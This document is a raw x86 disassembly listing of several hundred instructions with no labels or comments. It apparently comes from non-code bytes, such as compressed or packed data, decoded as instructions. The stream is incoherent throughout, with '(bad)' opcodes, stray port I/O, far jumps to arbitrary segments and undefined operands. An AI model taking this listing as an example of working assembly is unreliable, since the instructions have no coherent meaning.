  42eaab:	lds    ebx,FWORD PTR [esi+0x20c1e056]
  42eab1:	cmp    DWORD PTR [ecx-0xdac9b04],ebp
  42eab7:	mov    bh,0xc8
  42eab9:	cdq    
  42eaba:	mov    ebx,DWORD PTR [ebx-0x77936092]
  42eac0:	jp     0x42eb0c
  42eac2:	in     eax,dx
  42eac3:	jno    0x42ea9f
  42eac5:	fmul   st(6),st
  42eac7:	xor    al,0xb
  42eac9:	es jp  0x42eaed
  42eacc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42eacd:	loop   0x42eacb
  42eacf:	push   ecx
  42ead0:	adc    BYTE PTR ds:0x2bb6fe6b,dl
  42ead6:	sahf   
  42ead7:	fsub   QWORD PTR [ecx]
  42ead9:	xchg   edi,eax
  42eada:	mov    cl,BYTE PTR ds:0x203532d
  42eae0:	sbb    DWORD PTR [ecx-0x12],ebx
  42eae3:	dec    ebx
  42eae4:	xchg   esi,eax
  42eae5:	dec    esi
  42eae6:	pop    es
  42eae7:	mov    al,ds:0xe75ba461
  42eaec:	js     0x42eb52
  42eaee:	mov    WORD PTR [esi],?
  42eaf0:	test   BYTE PTR [ebp+0x591dff8f],bl
  42eaf6:	pop    ecx
  42eaf7:	xor    al,0x17
  42eaf9:	xor    edx,DWORD PTR [ebx]
  42eafb:	fimul  DWORD PTR [esi]
  42eafd:	leave  
  42eafe:	pop    esp
  42eaff:	sbb    ah,al
  42eb01:	call   0x4aa8:0xa8175cb
  42eb08:	push   ds
  42eb09:	jmp    0x4c0e6d73
  42eb0e:	push   0xb
  42eb10:	xor    al,0xa4
  42eb12:	sbb    eax,DWORD PTR [edx]
  42eb14:	sar    DWORD PTR [ecx],0x86
  42eb17:	mov    ch,0xdc
  42eb19:	push   ebp
  42eb1a:	ss mov edi,0x94b02e89
  42eb20:	pop    ebp
  42eb21:	mov    ?,WORD PTR [ebx]
  42eb23:	or     DWORD PTR ds:0xd5ea6afc,esi
  42eb29:	adc    al,BYTE PTR [esi-0x4c]
  42eb2c:	in     eax,dx
  42eb2d:	jp     0x42eb73
  42eb2f:	dec    edx
  42eb30:	sbb    al,0xe5
  42eb32:	in     eax,0x1e
  42eb34:	lahf   
  42eb35:	jl     0x42eb67
  42eb37:	(bad)  
  42eb38:	mov    ch,0x64
  42eb3a:	mov    cl,dh
  42eb3c:	adc    al,0x24
  42eb3e:	dec    esp
  42eb3f:	popf   
  42eb40:	cmp    ah,BYTE PTR [edi]
  42eb42:	retf   
  42eb43:	daa    
  42eb44:	xchg   edi,eax
  42eb45:	shl    BYTE PTR [ebx-0x3e51c68c],0x5
  42eb4c:	add    al,0x9e
  42eb4e:	retf   
  42eb4f:	mov    bl,0xeb
  42eb51:	int    0x72
  42eb53:	xchg   ebp,eax
  42eb54:	push   edx
  42eb55:	or     al,0x83
  42eb57:	out    dx,al
  42eb58:	dec    eax
  42eb59:	jp     0x42eb25
  42eb5b:	add    al,0xa1
  42eb5d:	test   BYTE PTR [esp+eax*1-0x753bda2a],0x17
  42eb65:	cmp    eax,0x7105ab93
  42eb6a:	clc    
  42eb6b:	jmp    0xd6db:0x2eef8c7d
  42eb72:	mov    ecx,0xfaa7034
  42eb77:	mov    esp,0xf03ffa45
  42eb7c:	and    DWORD PTR [edi],eax
  42eb7e:	dec    ecx
  42eb7f:	test   DWORD PTR [ebx+ebp*4],eax
  42eb82:	jbe    0x42ebbf
  42eb84:	push   ss
  42eb85:	inc    ebp
  42eb86:	cmp    ah,0x1e
  42eb89:	fmul   QWORD PTR [edx+ecx*1]
  42eb8c:	(bad)  
  42eb8d:	bound  ebx,QWORD PTR ss:[edi+0x1f]
  42eb91:	mov    al,ds:0xdd93d8e
  42eb96:	outs   dx,DWORD PTR ds:[esi]
  42eb97:	dec    ebp
  42eb98:	mov    ebx,0x1f2524a0
  42eb9d:	mov    eax,0xc3203287
  42eba2:	sub    esp,DWORD PTR [edx+0x5d]
  42eba5:	and    al,0x10
  42eba7:	rcr    BYTE PTR [ecx],1
  42eba9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ebaa:	or     eax,0xd0094715
  42ebaf:	pop    esp
  42ebb0:	jp     0x42ebc1
  42ebb2:	aas    
  42ebb3:	xor    DWORD PTR [eax],esp
  42ebb5:	cli    
  42ebb6:	inc    ebp
  42ebb7:	test   bh,dl
  42ebb9:	add    al,0x3d
  42ebbb:	ret    0xa7db
  42ebbe:	or     eax,DWORD PTR [esi+0x2a]
  42ebc1:	mov    ss,WORD PTR [edx]
  42ebc3:	push   0x30
  42ebc5:	sub    DWORD PTR [esi+edx*1-0x14],ebp
  42ebc9:	sbb    BYTE PTR [eax+0x59],dl
  42ebcc:	mov    ds:0xe535e8c7,al
  42ebd1:	mov    ds:0x5b92eb96,eax
  42ebd6:	cmp    DWORD PTR [esi+0x20],edi
  42ebd9:	test   eax,0xf83b63b8
  42ebde:	xchg   BYTE PTR [esi+0x59],cl
  42ebe1:	mov    cl,0x1b
  42ebe3:	clc    
  42ebe4:	xchg   esp,eax
  42ebe5:	pushf  
  42ebe6:	jae    0x42eb77
  42ebe8:	mov    edi,0x9762028a
  42ebed:	mov    eax,ds:0xf905ffbb
  42ebf2:	imul   esp,DWORD PTR [esi+0x3b29f9a],0x43fd5925
  42ebfc:	les    edi,FWORD PTR [edi]
  42ebfe:	jnp    0x42ec5c
  42ec00:	in     eax,dx
  42ec01:	jnp    0x42ebaf
  42ec03:	push   ds
  42ec04:	sti    
  42ec05:	call   0x6764c9cf
  42ec0a:	pushf  
  42ec0b:	mov    ecx,0xd95ccfaa
  42ec10:	ja     0x42ec58
  42ec12:	sub    eax,DWORD PTR [ebp+0x21]
  42ec15:	mov    ebp,0x3fca96ee
  42ec1a:	mov    edi,0x69d13329
  42ec1f:	and    eax,0xe9c29703
  42ec24:	mov    bl,0x33
  42ec26:	nop
  42ec27:	sbb    DWORD PTR [ebx+0x7f23937],eax
  42ec2d:	mov    eax,ds:0xc851eca4
  42ec32:	mov    dh,0xf4
  42ec34:	fdivr  QWORD PTR [edx]
  42ec36:	mov    ds:0x48ca36dc,eax
  42ec3b:	sbb    ebx,ebx
  42ec3d:	add    al,0xc1
  42ec3f:	ds jae 0x42ebc5
  42ec42:	mov    esi,0xb735b9ac
  42ec47:	hlt    
  42ec48:	mov    ecx,ecx
  42ec4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ec4b:	sub    dh,ch
  42ec4d:	add    BYTE PTR [esi+0x3cc394e9],dh
  42ec53:	test   eax,0x79aaf91a
  42ec58:	imul   ecx,DWORD PTR [edx+0x1c],0x6b9f1e1d
  42ec5f:	data16 or BYTE PTR [esi+edx*4-0x56],ch
  42ec64:	inc    ebp
  42ec65:	stos   DWORD PTR es:[edi],eax
  42ec66:	dec    edx
  42ec67:	ja     0x42ec24
  42ec69:	sti    
  42ec6a:	jb     0x42ec12
  42ec6c:	(bad)  [eax-0x4e]
  42ec6f:	mov    WORD PTR [edx-0x64],gs
  42ec72:	sub    edi,esi
  42ec74:	bound  ebp,QWORD PTR [ebp+0x4e]
  42ec77:	into   
  42ec78:	daa    
  42ec79:	xor    eax,0x4b62cfa
  42ec7e:	mov    dl,0x54
  42ec80:	cmc    
  42ec81:	or     ah,BYTE PTR [ebx]
  42ec83:	lahf   
  42ec84:	out    dx,eax
  42ec85:	mov    ah,0xcd
  42ec87:	repz gs and ah,cl
  42ec8b:	repnz mov bh,0xbf
  42ec8e:	inc    ebx
  42ec8f:	inc    eax
  42ec90:	jle    0x42ece2
  42ec92:	fsubr  st,st(3)
  42ec94:	push   ss
  42ec95:	push   ds
  42ec96:	mov    eax,0x46b270f4
  42ec9b:	aad    0x46
  42ec9d:	daa    
  42ec9e:	iret   
  42ec9f:	aam    0x1c
  42eca1:	mov    eax,ds:0xd355cbd
  42eca6:	sbb    DWORD PTR [ebx+0x4bd4aaa],0xabfb46fc
  42ecb0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ecb1:	scas   eax,DWORD PTR es:[edi]
  42ecb2:	ficomp WORD PTR fs:[eax]
  42ecb5:	fld    DWORD PTR [edx+ebx*4]
  42ecb8:	dec    ebp
  42ecb9:	shr    BYTE PTR [eax],cl
  42ecbb:	xchg   esi,eax
  42ecbc:	(bad)  
  42ecbe:	mov    cl,0x44
  42ecc0:	jecxz  0x42ecca
  42ecc2:	shl    ebx,1
  42ecc4:	out    0x7,al
  42ecc6:	push   esi
  42ecc7:	adc    al,0x7d
  42ecc9:	lods   al,BYTE PTR ds:[esi]
  42ecca:	ret    0x9f5d
  42eccd:	idiv   BYTE PTR [edi-0x438f6e64]
  42ecd3:	test   al,0x98
  42ecd5:	mov    bh,0x3b
  42ecd7:	fcomp  DWORD PTR [ebp+0x2b]
  42ecda:	xchg   esp,eax
  42ecdb:	jmp    0x42ec78
  42ecdd:	dec    eax
  42ecde:	sbb    eax,0xbe0f4785
  42ece3:	inc    ebp
  42ece4:	ja     0x42ec8d
  42ece6:	ja     0x42ecb7
  42ece8:	inc    ebp
  42ece9:	jg     0x42ecf4
  42eceb:	pop    esp
  42ecec:	mov    ds:0xfe802a4,eax
  42ecf1:	adc    DWORD PTR [eax-0x67bd16ec],edi
  42ecf7:	xchg   ebp,eax
  42ecf8:	mov    ch,0x3d
  42ecfa:	shr    ah,cl
  42ecfc:	(bad)  
  42ecfe:	(bad)  
  42ecff:	retf   
  42ed00:	sbb    cl,BYTE PTR [ecx]
  42ed02:	mov    esp,0x2fcaf8de
  42ed07:	inc    esp
  42ed08:	mov    ebx,DWORD PTR [edi+0x12ab063b]
  42ed0e:	pop    edi
  42ed0f:	das    
  42ed10:	aam    0x7
  42ed12:	call   0x1564:0xb313568c
  42ed19:	jl     0x42ecd0
  42ed1b:	or     edi,esi
  42ed1d:	push   ecx
  42ed1e:	inc    eax
  42ed1f:	pop    edx
  42ed20:	mov    ch,0x58
  42ed22:	lods   al,BYTE PTR ds:[esi]
  42ed23:	out    dx,al
  42ed24:	sahf   
  42ed25:	daa    
  42ed26:	sub    eax,0xcfc14c0e
  42ed2b:	test   BYTE PTR [edx],dl
  42ed2d:	mov    ah,0xaa
  42ed2f:	pop    edx
  42ed30:	jnp    0x42ed04
  42ed32:	mov    ebx,0x91f353a2
  42ed37:	das    
  42ed38:	adc    esp,DWORD PTR [esi-0x6b37b2c0]
  42ed3e:	aam    0xcd
  42ed40:	xchg   ebx,eax
  42ed41:	jmp    0xe84659e5
  42ed46:	jg     0x42ed2e
  42ed48:	or     BYTE PTR [esi],bl
  42ed4a:	mov    al,0xb3
  42ed4c:	inc    esi
  42ed4d:	stc    
  42ed4e:	rcl    BYTE PTR [eax+eiz*1-0x63],1
  42ed52:	popa   
  42ed53:	and    DWORD PTR [edi-0x11efe2c5],ebx
  42ed59:	leave  
  42ed5a:	mov    bl,0x94
  42ed5c:	adc    ebx,esi
  42ed5e:	sbb    DWORD PTR [ecx+0x733fb51b],0x5bcd4ad6
  42ed68:	cmc    
  42ed69:	adc    BYTE PTR [edi+0x6615fecf],bl
  42ed6f:	jmp    0xd7ef:0x77c26920
  42ed76:	dec    ecx
  42ed77:	out    dx,al
  42ed78:	setg   BYTE PTR [ebx-0x6e]
  42ed7c:	dec    edx
  42ed7d:	ret    0x9ffd
  42ed80:	lea    eax,[esi-0x147e83a8]
  42ed86:	xor    bh,BYTE PTR [edi+edx*1]
  42ed89:	imul   esi,DWORD PTR [ebx],0xeed019cd
  42ed8f:	shl    ebp,0xb2
  42ed92:	dec    ecx
  42ed93:	jmp    0x3438f8e3
  42ed98:	push   ds
  42ed99:	mov    ecx,0x61f4a32a
  42ed9e:	and    eax,edi
  42eda0:	jno    0x42ed41
  42eda2:	fwait
  42eda3:	in     al,0xdb
  42eda5:	pop    ebp
  42eda6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42eda7:	dec    ebp
  42eda8:	scas   eax,DWORD PTR es:[edi]
  42eda9:	add    esi,esp
  42edab:	sar    DWORD PTR [eax+eax*4-0x58],0x6
  42edb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42edb1:	popa   
  42edb2:	mov    bh,0xa8
  42edb4:	jo     0x42ed50
  42edb6:	mov    ebx,0x2e23022f
  42edbb:	mov    esp,0x44627933
  42edc0:	jae    0x42ed4a
  42edc2:	out    dx,eax
  42edc3:	fs call 0x228ac89b
  42edc9:	jle    0x42ed59
  42edcb:	repnz aad 0x73
  42edce:	aam    0xe9
  42edd0:	(bad)  
  42edd1:	jne    0x42edce
  42edd3:	push   0x340a38b8
  42edd8:	sub    ah,BYTE PTR [esi-0x48]
  42eddb:	test   BYTE PTR [esi-0x64],al
  42edde:	jb     0x42edf9
  42ede0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ede1:	jns    0x42ee41
  42ede3:	iret   
  42ede4:	sbb    eax,0x5558281b
  42ede9:	lock and al,0xe3
  42edec:	sbb    DWORD PTR [ecx+0x6134a4b0],esi
  42edf2:	ds div ebp
  42edf5:	dec    ecx
  42edf6:	pop    esi
  42edf7:	in     eax,0x2c
  42edf9:	jb     0x42edd8
  42edfb:	scas   eax,DWORD PTR es:[edi]
  42edfc:	and    cl,BYTE PTR [ecx-0x54]
  42edff:	call   0xed595bfd
  42ee04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ee05:	in     ax,dx
  42ee07:	mov    ecx,0x4873a272
  42ee0c:	mov    ds:0x161f9c59,al
  42ee11:	sbb    DWORD PTR [esi-0x4dc2fb6f],ebp
  42ee17:	pop    ecx
  42ee18:	pop    esp
  42ee19:	aad    0x4b
  42ee1b:	add    DWORD PTR [esi-0x33],0x4719e16a
  42ee22:	mov    ?,WORD PTR [ebx+0x4a8ca92e]
  42ee28:	(bad)  
  42ee29:	fs in  al,0x5c
  42ee2c:	pop    ds
  42ee2d:	(bad)  
  42ee2e:	ror    dh,1
  42ee30:	xor    eax,0xade6a1d5
  42ee35:	dec    eax
  42ee36:	imul   BYTE PTR [edi+0x35]
  42ee39:	lock ds (bad) 
  42ee3c:	out    0xce,al
  42ee3e:	mov    ebp,0x8b889344
  42ee43:	iret   
  42ee44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ee45:	rcr    DWORD PTR [ecx],0xf3
  42ee48:	or     bl,0x7
  42ee4b:	into   
  42ee4c:	test   DWORD PTR [esi+eiz*2+0x4d],0xe8196bf5
  42ee54:	in     al,dx
  42ee55:	pop    ss
  42ee56:	rcr    BYTE PTR [edx],0xa5
  42ee59:	jge    0x42eeba
  42ee5b:	in     eax,0x7c
  42ee5d:	je     0x42ee55
  42ee5f:	pop    ebx
  42ee60:	nop
  42ee61:	adc    BYTE PTR ds:0xbb5e2b77,al
  42ee67:	and    al,0x91
  42ee69:	push   edi
  42ee6a:	in     al,dx
  42ee6b:	push   ebp
  42ee6c:	adc    al,0x9b
  42ee6e:	fld    TBYTE PTR [esi-0x1593fca8]
  42ee74:	push   es
  42ee75:	add    ah,al
  42ee77:	inc    eax
  42ee78:	pop    esi
  42ee79:	jno    0x42ee28
  42ee7b:	in     eax,0x9b
  42ee7d:	mov    ch,0x5a
  42ee7f:	jmp    0xd85e91ba
  42ee84:	std    
  42ee85:	inc    ebp
  42ee86:	jg     0x42ee6a
  42ee88:	inc    edx
  42ee89:	test   BYTE PTR [edx-0x53],ch
  42ee8c:	xlat   BYTE PTR ds:[ebx]
  42ee8d:	mov    ds:0x9e73843,al
  42ee92:	pusha  
  42ee93:	ffreep st(7)
  42ee95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ee96:	stos   DWORD PTR es:[edi],eax
  42ee97:	dec    esi
  42ee98:	push   0x50
  42ee9a:	mov    bh,0xb1
  42ee9c:	aas    
  42ee9d:	mov    ss:0xec3cf480,al
  42eea3:	hlt    
  42eea4:	es mov ch,0x3
  42eea7:	inc    edi
  42eea8:	fdiv   DWORD PTR [esi-0x25afa5c]
  42eeae:	or     al,0xe6
  42eeb0:	or     eax,0x26a9b383
  42eeb5:	mov    ecx,0xeda2a663
  42eeba:	rol    ebx,0x17
  42eebd:	outs   dx,DWORD PTR ds:[esi]
  42eebe:	ss pop ebx
  42eec0:	push   ebp
  42eec1:	or     ebx,eax
  42eec3:	out    0x69,eax
  42eec5:	mov    ds:0x49867bca,al
  42eeca:	add    al,0x23
  42eecc:	mov    ebx,DWORD PTR [esi-0x19]
  42eecf:	push   ds
  42eed0:	and    DWORD PTR ds:0xb799792a,eax
  42eed6:	mov    esp,DWORD PTR [ecx]
  42eed8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42eed9:	pop    edi
  42eeda:	sub    DWORD PTR [ecx],ebx
  42eedc:	cmp    al,0xd3
  42eede:	inc    edi
  42eedf:	pop    edx
  42eee0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42eee1:	push   ss
  42eee2:	ins    BYTE PTR es:[edi],dx
  42eee3:	xchg   esp,eax
  42eee4:	and    DWORD PTR [ecx-0x25088888],ebx
  42eeea:	fs cmp al,0xce
  42eeed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42eeee:	mov    ebx,0xf07547a
  42eef3:	xor    dl,0x23
  42eef6:	xor    ch,BYTE PTR [eax+0x54b7370b]
  42eefc:	push   0xffffffdf
  42eefe:	(bad)  
  42eeff:	sub    dl,ch
  42ef01:	mov    esi,0xbc8bebf9
  42ef06:	aas    
  42ef07:	jmp    0x25ef:0xf6c24916
  42ef0e:	stos   BYTE PTR es:[edi],al
  42ef0f:	add    DWORD PTR [ebx-0x590e9d58],eax
  42ef15:	cli    
  42ef16:	(bad)  [ecx]
  42ef18:	fldenv [esp+edi*2]
  42ef1b:	js     0x42eebb
  42ef1d:	fs dec ecx
  42ef1f:	mov    fs,WORD PTR [eax]
  42ef21:	cdq    
  42ef22:	or     eax,0xe27f6523
  42ef27:	lods   eax,DWORD PTR ds:[esi]
  42ef28:	das    
  42ef29:	xchg   ebp,eax
  42ef2a:	lods   eax,DWORD PTR ds:[esi]
  42ef2b:	cmp    al,0x96
  42ef2d:	mov    al,ds:0xbfab5d7
  42ef32:	pop    edx
  42ef33:	ins    BYTE PTR es:[edi],dx
  42ef34:	sub    edi,DWORD PTR [ecx]
  42ef36:	mov    ebp,0xcc38e847
  42ef3b:	xor    al,0x1a
  42ef3d:	aaa    
  42ef3e:	pop    ds
  42ef3f:	rol    DWORD PTR [esi],1
  42ef41:	push   cs
  42ef42:	xlat   BYTE PTR ds:[ebx]
  42ef43:	sar    ch,1
  42ef45:	jmp    0xf558724
  42ef4a:	ret    0x158e
  42ef4d:	and    ebp,DWORD PTR [ebp+eiz*1+0x77]
  42ef51:	xchg   edi,eax
  42ef52:	mov    al,0xa4
  42ef54:	in     eax,0xc5
  42ef56:	or     DWORD PTR [ebx],0x28
  42ef59:	mov    cl,0x8a
  42ef5b:	mov    dl,0x87
  42ef5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ef5e:	sti    
  42ef5f:	sbb    ch,BYTE PTR [esi+0x2b]
  42ef62:	mov    ds:0x338921b3,eax
  42ef67:	aad    0x1b
  42ef69:	jmp    0x42efab
  42ef6b:	jle    0x42ef6a
  42ef6d:	lahf   
  42ef6e:	retf   
  42ef6f:	not    eax
  42ef71:	call   0xcf84713d
  42ef76:	mov    edx,0xed430239
  42ef7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ef7c:	fs sbb al,0x35
  42ef7f:	sbb    dl,BYTE PTR [edx+0x19da2060]
  42ef85:	imul   ebp,DWORD PTR [ebp-0x63],0x828c91d6
  42ef8c:	sbb    al,BYTE PTR [eax-0x22]
  42ef8f:	sub    ecx,DWORD PTR [ebx]
  42ef91:	sub    eax,ecx
  42ef93:	xor    al,0x3d
  42ef95:	shl    BYTE PTR [ecx+esi*2+0x433ba720],cl
  42ef9c:	mov    edi,0xe553a6c2
  42efa1:	cli    
  42efa2:	mov    dl,0xfe
  42efa4:	fcmovnb st,st(6)
  42efa6:	sub    dl,BYTE PTR ds:0x23c39c19
  42efac:	nop
  42efad:	fwait
  42efae:	jmp    0x8b2:0x16993590
  42efb5:	pushf  
  42efb6:	stos   BYTE PTR es:[edi],al
  42efb7:	inc    edi
  42efb8:	pop    ss
  42efb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42efba:	jecxz  0x42ef9d
  42efbc:	fild   QWORD PTR ds:0x39338ae5
  42efc2:	cwde   
  42efc3:	or     eax,DWORD PTR [ecx+edi*1]
  42efc6:	adc    BYTE PTR [esp+ebx*8],0xb5
  42efca:	jno    0x42efab
  42efcc:	gs mov ebp,0xcb10f32e
  42efd2:	fwait
  42efd3:	sbb    al,0x9d
  42efd5:	int3   
  42efd6:	add    DWORD PTR [edi-0xb94fd4b],esp
  42efdc:	and    BYTE PTR [eax+0x3537517a],bl
  42efe2:	addr16 int3 
  42efe4:	jp     0x42f054
  42efe6:	mov    ds:0x69882019,eax
  42efeb:	mov    esi,0x968891e
  42eff0:	lock xchg BYTE PTR [esi+0x23],al
  42eff4:	scas   eax,DWORD PTR es:[edi]
  42eff5:	mov    eax,ds:0x4e19ff4b
  42effa:	test   BYTE PTR [ebp-0x69dbf41a],al
  42f000:	push   0xffffffff
  42f002:	mov    esp,0x6e24aa84
  42f007:	xchg   edi,eax
  42f008:	mov    ch,0xb
  42f00a:	fsubp  st(0),st
  42f00c:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  42f00e:	cld    
  42f00f:	jge    0x42f036
  42f011:	stc    
  42f012:	xchg   ecx,eax
  42f013:	push   esp
  42f014:	clc    
  42f015:	lods   al,BYTE PTR ds:[esi]
  42f016:	mov    al,ds:0xcba49517
  42f01b:	fsubr  DWORD PTR [eax-0xd]
  42f01e:	push   esi
  42f01f:	jle    0x42efb2
  42f021:	iret   
  42f022:	dec    eax
  42f023:	jne    0x42f046
  42f025:	dec    edi
  42f026:	sub    esi,DWORD PTR [ebp-0x1783eee1]
  42f02c:	pop    ss
  42f02d:	mov    eax,ds:0x902c47fb
  42f032:	xchg   dl,ch
  42f034:	es and eax,0x38d6a151
  42f03a:	mov    ecx,0xe4f5a724
  42f03f:	je     0x42f088
  42f041:	mov    edi,DWORD PTR [esi-0x3a]
  42f044:	stos   BYTE PTR es:[edi],al
  42f045:	add    ch,BYTE PTR [edi+edi*1]
  42f048:	sbb    ecx,DWORD PTR ds:[edx*1+0x3fb9cebe]
  42f050:	dec    ecx
  42f051:	imul   eax,DWORD PTR [esi-0x4815caca],0xab9ab92c
  42f05b:	cwde   
  42f05c:	fnstenv [edx-0x6e]
  42f05f:	data16 aam 0xd3
  42f062:	(bad)  [eax-0x28]
  42f065:	mov    al,ds:0xdf7e94b1
  42f06a:	jmp    0x32da:0x3d2f47ce
  42f071:	xchg   esi,eax
  42f072:	subps  xmm4,XMMWORD PTR [ebx+0x19]
  42f076:	inc    edx
  42f077:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f078:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f079:	adc    edi,DWORD PTR [esp+edx*2-0x3c90a00e]
  42f080:	mov    ch,0xdf
  42f082:	(bad)  
  42f084:	pop    esp
  42f085:	ret    
  42f086:	aaa    
  42f087:	test   eax,0x38c41ce1
  42f08c:	lods   eax,DWORD PTR ds:[esi]
  42f08d:	xor    eax,ebp
  42f08f:	cli    
  42f090:	retf   0x85a6
  42f093:	out    dx,eax
  42f094:	sbb    eax,0x51a2b9c5
  42f099:	xchg   esp,eax
  42f09a:	fbstp  TBYTE PTR [ecx+0x18]
  42f09d:	xchg   ecx,eax
  42f09e:	fsubr  DWORD PTR [esi+0x525b67b2]
  42f0a4:	push   ds
  42f0a5:	dec    ecx
  42f0a6:	sub    DWORD PTR [eax+0x7f],ebx
  42f0a9:	sub    bh,BYTE PTR [edi+eax*1]
  42f0ac:	pop    ebp
  42f0ad:	ror    ebx,cl
  42f0af:	jl     0x42f0f4
  42f0b1:	mov    cl,0x51
  42f0b3:	cmp    BYTE PTR [edx],bl
  42f0b5:	pop    es
  42f0b6:	retf   
  42f0b7:	push   edx
  42f0b8:	sbb    al,0x9
  42f0ba:	popf   
  42f0bb:	cmp    eax,0x9b2694e0
  42f0c0:	out    0x7f,eax
  42f0c2:	ret    
  42f0c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f0c4:	(bad)
  42f0c7:	hlt    
  42f0c8:	or     al,0xed
  42f0ca:	test   DWORD PTR [edi-0x115046df],0x22efd1e1
  42f0d4:	push   edi
  42f0d5:	test   ch,ch
  42f0d7:	jmp    0x5a4a9465
  42f0dc:	dec    ebx
  42f0dd:	inc    ecx
  42f0de:	push   edx
  42f0df:	mov    al,ds:0x92a4c938
  42f0e4:	pop    es
  42f0e5:	or     edx,DWORD PTR [ebx-0x77]
  42f0e8:	cdq    
  42f0e9:	popf   
  42f0ea:	in     al,0xe7
  42f0ec:	or     eax,0xc5bbac0d
  42f0f1:	mov    WORD PTR [eax+0x7d32c179],es
  42f0f7:	out    0x23,al
  42f0f9:	test   eax,0x13ce84a6
  42f0fe:	add    al,0x79
  42f100:	or     ebx,DWORD PTR [ebx+0x3b]
  42f103:	nop
  42f104:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  42f106:	shr    eax,cl
  42f108:	mov    ecx,0x24be2354
  42f10d:	mov    esp,0xadfab919
  42f112:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f113:	daa    
  42f114:	xor    eax,0xc0e57b93
  42f119:	mov    ds:0x3a0b3fa8,al
  42f11e:	push   edx
  42f11f:	repz add al,0x9d
  42f122:	dec    ebp
  42f123:	cmp    BYTE PTR [ebx-0xaf85788],dh
  42f129:	gs shl bl,cl
  42f12c:	fst    DWORD PTR [esi+0x5986a576]
  42f132:	sbb    eax,DWORD PTR [eax]
  42f134:	rol    dh,cl
  42f136:	sbb    esi,0xffffffb9
  42f139:	cdq    
  42f13a:	jmp    0x90ff:0xcc58d166
  42f141:	test   BYTE PTR [ecx-0x6a],dl
  42f144:	fbstp  TBYTE PTR [edi]
  42f146:	mov    dl,0x8c
  42f148:	push   edx
  42f149:	mov    DWORD PTR [ebp+0x16],ecx
  42f14c:	jbe    0x42f146
  42f14e:	les    esi,FWORD PTR [ebx+0x6e5d9fd0]
  42f154:	adc    eax,0x7dec3d63
  42f159:	mov    WORD PTR [edi+0x23f93245],fs
  42f15f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f160:	sub    bl,bl
  42f162:	xor    BYTE PTR [esi-0x7b6fffe5],bh
  42f168:	lds    ebp,FWORD PTR [ebx]
  42f16a:	int    0xe5
  42f16c:	rcl    BYTE PTR [ebx+eax*4+0x6f2ce0db],1
  42f173:	je     0x42f14a
  42f175:	push   esp
  42f176:	cmp    edx,esi
  42f178:	shl    BYTE PTR [eax-0x3fc9b6f8],1
  42f17e:	inc    edi
  42f17f:	pop    esp
  42f180:	pop    es
  42f181:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f182:	dec    esp
  42f183:	jle    0x42f1b2
  42f185:	outs   dx,DWORD PTR ds:[esi]
  42f186:	pop    esp
  42f187:	jecxz  0x42f1c3
  42f189:	fnstcw WORD PTR [edi+0x4effac5d]
  42f18f:	sbb    BYTE PTR [ebx],ah
  42f191:	and    BYTE PTR [edx-0xd],0xf5
  42f195:	adc    esp,esp
  42f197:	repz sub ecx,DWORD PTR [ecx-0x2b68854b]
  42f19e:	fidiv  DWORD PTR [eax+0x18]
  42f1a1:	fxch   st(2)
  42f1a3:	imul   edi,DWORD PTR [ebx-0x2d],0x41
  42f1a7:	ins    DWORD PTR es:[edi],dx
  42f1a8:	or     eax,ebx
  42f1aa:	jnp    0x42f1af
  42f1ac:	dec    edi
  42f1ad:	add    BYTE PTR [ecx+0x4c],dh
  42f1b0:	sbb    BYTE PTR [edi+eiz*4],ah
  42f1b3:	push   ds
  42f1b4:	sbb    ecx,DWORD PTR [ecx]
  42f1b6:	aaa    
  42f1b7:	mov    eax,0x28a3ed36
  42f1bc:	jp     0x42f20b
  42f1be:	int3   
  42f1bf:	mov    esi,0x40cb34ed
  42f1c4:	xchg   ecx,eax
  42f1c5:	mov    ecx,0xf91954b4
  42f1ca:	cld    
  42f1cb:	mov    BYTE PTR [eax+0x1d4efad4],bl
  42f1d1:	mov    eax,0xdcb5707b
  42f1d6:	pop    ss
  42f1d7:	sahf   
  42f1d8:	jmp    0x1ffa4a78
  42f1dd:	dec    ecx
  42f1de:	inc    edi
  42f1df:	jmp    0x8168:0x1cebfc7f
  42f1e6:	cs inc ebx
  42f1e8:	cld    
  42f1e9:	xchg   edx,eax
  42f1ea:	pushf  
  42f1eb:	mov    eax,0xc575dd23
  42f1f0:	lea    ecx,[esi]
  42f1f2:	pop    ds
  42f1f3:	ins    BYTE PTR es:[edi],dx
  42f1f4:	outs   dx,BYTE PTR ds:[esi]
  42f1f5:	xlat   BYTE PTR ds:[ebx]
  42f1f6:	mov    edi,0x4430e5f4
  42f1fb:	cmp    al,0xf5
  42f1fd:	stos   DWORD PTR es:[edi],eax
  42f1fe:	pop    eax
  42f1ff:	in     eax,dx
  42f200:	les    ecx,FWORD PTR es:[esp+edx*1+0x29]
  42f205:	test   eax,0x458f36c7
  42f20a:	pop    ds
  42f20b:	stos   DWORD PTR es:[edi],eax
  42f20c:	daa    
  42f20d:	in     eax,0x29
  42f20f:	test   BYTE PTR [esi-0x63],dl
  42f212:	mov    ebx,0x85325333
  42f217:	xor    bl,BYTE PTR [ebx]
  42f219:	push   0x22
  42f21b:	mov    ds:0xc4b316bf,eax
